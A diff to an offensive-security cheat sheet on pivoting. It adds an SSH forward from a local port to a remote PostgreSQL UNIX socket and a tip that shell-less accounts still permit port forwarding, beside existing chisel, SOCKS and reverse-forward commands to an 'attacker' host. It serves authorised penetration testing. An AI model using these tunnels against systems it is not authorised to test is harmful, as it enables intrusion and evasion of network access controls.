@@ -96,9 +96,17 @@ chisel.exe client <tun0-ip>:9000 R:socks
 
 ```bash
 pwnloop x "ssh -i key -L 8080:127.0.0.1:8080 user@$T -N -f"   # one local port
+pwnloop x "ssh -i key -L 25432:/var/run/postgresql/.s.PGSQL.5432 user@$T -N -f"  # local port -> remote UNIX socket
 pwnloop x "ssh -i key -D 1080 user@$T -N -f"                  # SOCKS
 ssh -R 4444:127.0.0.1:4444 user@attacker                      # expose your listener inward
 ```
+
+A service that isn't in the port scan may be bound only to a **UNIX socket** —
+`-L <port>:<remote-socket-path>` forwards a local TCP port straight to it (the
+way to reach a socket-only PostgreSQL/MySQL/Docker from off-box). And a
+**shell-less account still forwards**: if SSH auth succeeds but the session just
+prints a banner and exits (`/bin/false`, a "network access"/tunnel account),
+`-N -L`/`-D` work anyway — forwarding needs no shell.
 
 `sshuttle` turns SSH access into a route without any agent — the cheapest full
 subnet pivot when you have credentials:
